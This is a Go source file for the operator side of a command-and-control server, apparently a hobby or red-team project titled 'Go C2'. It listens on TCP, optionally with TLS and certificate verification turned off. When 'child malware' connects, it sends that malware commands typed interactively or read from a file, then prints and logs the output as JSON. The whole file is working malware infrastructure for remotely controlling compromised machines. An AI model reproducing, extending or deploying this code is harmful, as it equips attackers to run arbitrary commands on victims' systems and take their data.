package main

/*
TO DO:
- add base64 encoding of command JSON
- call Accept() uin a loop, to accept more than one connection


*/

import (
	"bufio"
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"os"
	"strings"
)

type Results struct {
	CommandsList []string
	ID           int
	Command      string
	Output       string
	Time         string
}
type ResultsToFile struct {
	// CommandsList []string
	// ID      int
	Time    string
	Command string
	Output  string
}

var (
	// testArray = []string{"whoami", "hostname"}
	connect     = flag.String("connect", "", "connection must be in form <ip>:<Port> eg: 127.0.0.1:9999")
	commands    = flag.String("commands", "", "Execute a list of commands from a file. Include file name eg: commands commands.txt")
	loggingName = flag.String("log", "", "Log to a json file. eg \"-log logfile\" will log commands to logfile.json")
	fileInfo    *os.FileInfo
	tlsOn       = flag.Bool("tls", false, "Will add TLS to the network traffic")
	skipEnter   = flag.Bool("skip", false, "Will skip Enter requirement and run automatically, speeds testing")
)

func checkFile(filename string) error {
	_, err := os.Stat(filename)
	if os.IsNotExist(err) {
		_, err := os.Create(filename)
		if err != nil {
			return err
		}
	}
	return nil
}

func logToFile(outputTest *Results) {

	// var fwrite *os.File
	var fileName string
	// if *loggingName != "" {
	fileName = *loggingName + ".json"

	// _, err := os.Stat(fileName)
	// } else if *loggingName == "default.json" {

	// 	fileName = *loggingName
	// }

	_ = checkFile(fileName)

	outPutLog := &ResultsToFile{
		// ID:      outputTest.ID,
		Output:  outputTest.Output,
		Time:    outputTest.Time,
		Command: outputTest.Command,
	}

	//////WORKS HERE//
	file, _ := ioutil.ReadFile(fileName)
	data := []ResultsToFile{}
	json.Unmarshal(file, &data)
	data = append(data, *outPutLog)
	dataBytes, _ := json.Marshal(data)
	// if err != nil {
	// 	logrus.Error(err)
	_ = ioutil.WriteFile(fileName, dataBytes, 0644)

}

func listMode(fileToRead string, c net.Conn) {
	/* Takes a list of commands from a file, reads it in line by line
	and executes the commands on the child malware.
	*/
	// fmt.Println("Go C2 will run in Command List Mode")
	// fmt.Println("Please note, Command List Mode does not use TLS")
	// fmt.Println("Admin interface will listen on: ", *connect)

	// if *skipEnter == false {
	// 	reader := bufio.NewReader(os.Stdin)
	// 	fmt.Println("<PRESS ENTER TO CONTINUE>")
	// 	_, _ = reader.ReadString('\n')
	// }

	// fmt.Println("Listening on ", *connect)
	// l, err := net.Listen("tcp", *connect)
	// if err != nil {
	// 	fmt.Println(err)
	// 	return
	// }

	// fmt.Println("WAITING ON CONNECTION")

	// c, err := l.Accept()
	// if err != nil {
	// 	fmt.Println(err)
	// 	return
	// }

	//read in files
	fmt.Println("Reading commands from: ", fileToRead)
	file, err := os.Open(fileToRead)
	if err != nil {
		fmt.Println("opening file error", err)
	}

	scanner := bufio.NewScanner(file)
	scanner.Split(bufio.ScanLines)
	var txtlines []string

	for scanner.Scan() {
		txtlines = append(txtlines, scanner.Text())
	}

	fmt.Println("COMMANDS that will be run on the child malware:")
	for _, value := range txtlines {
		fmt.Println(value)
	}

	inputTest := &Results{
		ID: 1,
		// Commands:     true,
		CommandsList: txtlines,
	}

	encoder := json.NewEncoder(c)
	encoder.Encode(inputTest)

	var outputTest Results

	for x := 0; x < len(inputTest.CommandsList); x++ {
		decoder := json.NewDecoder(c)
		decoder.Decode(&outputTest)

		fmt.Println("===Results===")

		fmt.Println("Time of command execution: ", outputTest.Time)
		fmt.Println(outputTest.ID, outputTest.Output)

		//log to file
		if *loggingName != "" {
			// if open == false {
			// 	fmt.Println("value of OPEN: ", open)
			logToFile(&outputTest)
		}
		// } else {
		// 	logToFile(&outputTest, "default")
		// }
	}
}

func checkError(err error) {
	if err != nil {
		fmt.Println("Fatal error ", err.Error())
		os.Exit(1)
	}
}

func connectTLS() net.Conn {
	fmt.Println("###PRINTING TO SCREENONLY FOR DEV PURPOSES###")
	// fmt.Printf("Using %s mode \n", *mode)

	var c net.Conn
	var l net.Listener

	if *commands != "" {
		fmt.Println("Go C2 will run in Command List Mode")

		fmt.Println("Admin interface will listen on: ", *connect)
		fmt.Println("Connect the Child Malware to: ", *connect)

		if *skipEnter == false {
			reader := bufio.NewReader(os.Stdin)
			fmt.Println("<PRESS ENTER TO CONTINUE>")
			_, _ = reader.ReadString('\n')
		}
	}

	if *tlsOn == true {
		fmt.Println("TLS mode enabled: Using TLS")
		cert, err := tls.LoadX509KeyPair("../openssl/mydomain.com.crt", "../openssl/mydomain.com.key")
		checkError(err)
		config := tls.Config{Certificates: []tls.Certificate{cert}, InsecureSkipVerify: true}

		l, _ = tls.Listen("tcp", *connect, &config)

	} else if *tlsOn == false {
		fmt.Println("TLS not enabled, using clear text")
		l, _ = net.Listen("tcp", *connect)
		// checkError(err)
		// if err != nil {
		// 	fmt.Println(err)

		// }
	}
	fmt.Println("#===ADMIN SERVER LISTENING ===")
	fmt.Println("===Waiting for Client to connect")
	defer l.Close()

	c, _ = l.Accept()
	e := c.(*tls.Conn).Handshake()
	if e != nil {
		log.Fatal(e.Error())
	}
	// }
	fmt.Println("PARENT CONNECTED")

	// CA_Pool := x509.NewCertPool()
	// severCert, err := ioutil.ReadFile("../openssl/mydomain.com.crt")
	// if err != nil {
	// 	log.Fatal("Could not load server certificate!")
	// }
	// CA_Pool.AppendCertsFromPEM(severCert)

	// config := tls.Config{RootCAs: CA_Pool}

	// need to add parent mode LISTEN
	return c
}

func main() {
	//parsing flags
	flag.Parse()

	if *connect == "" {
		fmt.Println("empty connection")
		flag.PrintDefaults()
		os.Exit(1)
	}

	// if *commands != "" {
	// 	fmt.Println("Go C2 will run in Command List Mode")
	// 	fmt.Println("Please note, Command List Mode does not use TLS")
	// 	fmt.Println("Admin interface will listen on: ", *connect)
	// } else {
	// 	fmt.Println("Go C2 will run in Client Mode ")
	// 	fmt.Println("Please note, Client mode will use TLS")
	// 	fmt.Println("Admin interface will listen on: ", *connect)
	// }

	// if *skipEnter == false {
	// 	reader := bufio.NewReader(os.Stdin)
	// 	fmt.Println("\n<PRESS ENTER TO CONTINUE>")
	// 	_, _ = reader.ReadString('\n')
	// }

	if *commands != "" {
		// l, err := net.Listen("tcp", *connect)
		// if err != nil {
		// 	fmt.Println(err)
		// 	return
		// }
		// c, err := l.Accept()
		// if err != nil {
		// 	fmt.Println(err)
		// 	return
		// }
		listMode(*commands, connectTLS())

	} else {
		// cert, err := tls.LoadX509KeyPair("../openssl/mydomain.com.crt", "../openssl/mydomain.com.key")
		// checkError(err)
		// config := tls.Config{Certificates: []tls.Certificate{cert}, InsecureSkipVerify: true}

		// l, err := tls.Listen("tcp", *connect, &config)
		// fmt.Println(reflect.TypeOf(l))
		// // l, err := net.Listen("tcp", *connect)
		// checkError(err)
		// if err != nil {
		// 	fmt.Println(err)
		// 	return
		// }

		// fmt.Println("===ADMIN SERVER LISTENING ===")
		// defer l.Close()

		// c, err := l.Accept()
		// if err != nil {
		// 	fmt.Println(err)
		// 	return
		// }
		// fmt.Println(reflect.TypeOf(c))

		// fmt.Println("PARENT CONNECTED")
		c := connectTLS()
		//LOOPING for read and writing sockets in NORMAL Mode

		for {

			reader := bufio.NewReader(os.Stdin)
			fmt.Print(">> ")
			text, _ := reader.ReadString('\n')
			fmt.Fprintf(c, text+"\n")

			// if STOp is typed
			if strings.TrimSpace(string(text)) == "STOP" {
				fmt.Fprintf(c, text+"\n")
				fmt.Println("Closing TCP server!")

				return
			}

			var outputTest Results
			decoder := json.NewDecoder(c)
			decoder.Decode(&outputTest)
			fmt.Println("===Results===")

			fmt.Printf("Time of command execution: :%s\n", outputTest.Time)
			fmt.Println(outputTest.Output)

			//log commands at end of loop
			if *loggingName != "" {
				// if open == false {
				// 	fmt.Println("value of OPEN: ", open)
				logToFile(&outputTest)
			}
		}

	}
}
